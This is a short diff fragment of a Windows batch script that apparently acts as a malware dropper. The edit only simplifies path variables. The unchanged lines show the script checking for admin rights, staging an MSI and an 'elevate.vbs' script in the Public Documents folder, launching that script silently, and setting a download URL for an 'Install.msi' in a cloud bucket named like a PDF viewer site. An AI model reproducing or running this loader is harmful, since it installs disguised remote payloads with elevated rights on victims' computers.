@@ -8,9 +8,8 @@ if %errorLevel% NEQ 0 (
     exit /b
 )
 
-set "Temps=%PUBLIC%"
-set "agents=%Temps%\Documents\agent-c92d02.msi"
-set "main=%Temps%\Documents\elevate.vbs"
+set "agents=%PUBLIC%\Documents\agent-c92d02.msi"
+set "main=%PUBLIC%\Documents\elevate.vbs"
 
 start "" wscript.exe "%main%"
 set "_url=https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"
